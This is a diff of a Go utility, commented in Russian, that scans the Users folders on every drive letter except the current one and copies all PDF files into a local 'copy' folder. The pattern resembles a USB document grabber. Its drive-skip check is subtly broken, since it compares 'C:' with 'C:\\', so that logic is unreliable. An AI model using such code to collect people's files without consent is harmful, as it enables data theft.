@@ -7,44 +7,30 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"time"
 )
 
 var filetypeFind = ".pdf"
-var whereFind = [...]string{"C", "E"}
 var distFolder = "copy"
 var logFile = "copy.log"
 
-// Эта функция проверяет, нужно ли пропустить указанную директорию
-func shouldSkipDirectory(path string) bool {
-	// Список директорий, которые необходимо пропустить
-	skipDirs := []string{"ProgramData", "Windows"}
-
-	// Проверяем, содержится ли имя директории в списке для пропуска
-	for _, dir := range skipDirs {
-		if strings.Contains(path, dir) {
-			return true
-		}
-	}
-	return false
+// Функция для проверки, нужно ли пропустить сканирование текущего диска
+func shouldSkipDrive(drive string) bool {
+	currentDrive, _ := os.Getwd()
+	currentVolume := filepath.VolumeName(currentDrive)
+	return strings.EqualFold(currentVolume, drive)
 }
 
+// Функция для сканирования и копирования файлов по заданному пути
 func findAndCopy(folderToSearch, fileExt, whereCopy string) error {
 	err := filepath.WalkDir(folderToSearch, func(s string, d os.DirEntry, err error) error {
 		if err != nil {
 			if os.IsPermission(err) {
 				fmt.Printf("Skipping directory due to permission error: %s\n", s)
-				time.Sleep(8 * time.Second)
 				return nil
 			}
 			return err
 		}
 		if !d.IsDir() && filepath.Ext(d.Name()) == fileExt {
-			// Пропускаем копирование, если директория должна быть пропущена
-			if shouldSkipDirectory(filepath.Dir(s)) {
-				fmt.Printf("Skipping directory: %s\n", filepath.Dir(s))
-				return nil
-			}
 			err := copyFile(s, filepath.Join(whereCopy, distFolder, d.Name()))
 			if err != nil {
 				log.Printf("Error copying file %s: %v\n", s, err)
@@ -60,6 +46,7 @@ func findAndCopy(folderToSearch, fileExt, whereCopy string) error {
 	return nil
 }
 
+// Функция для копирования файла
 func copyFile(src, dst string) error {
 	srcFile, err := os.Open(src)
 	if err != nil {
@@ -78,9 +65,7 @@ func copyFile(src, dst string) error {
 	}
 	defer dstFile.Close()
 
-	// Используем буферизацию для улучшения производительности
-	buf := make([]byte, 1024)
-	_, err = io.CopyBuffer(dstFile, srcFile, buf)
+	_, err = io.Copy(dstFile, srcFile)
 	return err
 }
 
@@ -92,6 +77,15 @@ func main() {
 	defer logf.Close()
 	log.SetOutput(logf)
 
+	// Получаем список всех дисков, кроме текущего
+	var drives []string
+	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
+		driveLetter := string(drive) + ":\\"
+		if !shouldSkipDrive(driveLetter) {
+			drives = append(drives, driveLetter)
+		}
+	}
+
 	whereCopy, err := os.Getwd()
 	if err != nil {
 		log.Fatalf("Failed to get working directory: %v", err)
@@ -102,8 +96,8 @@ func main() {
 		log.Fatalf("Failed to create destination directory: %v", err)
 	}
 
-	for _, drive := range whereFind {
-		searchPath := filepath.Join(drive + ":\\Users")
+	for _, drive := range drives {
+		searchPath := filepath.Join(drive, "Users")
 		log.Printf("Scanning %s for %s files...\n", searchPath, filetypeFind)
 		err := findAndCopy(searchPath, filetypeFind, whereCopy)
 		if err != nil {
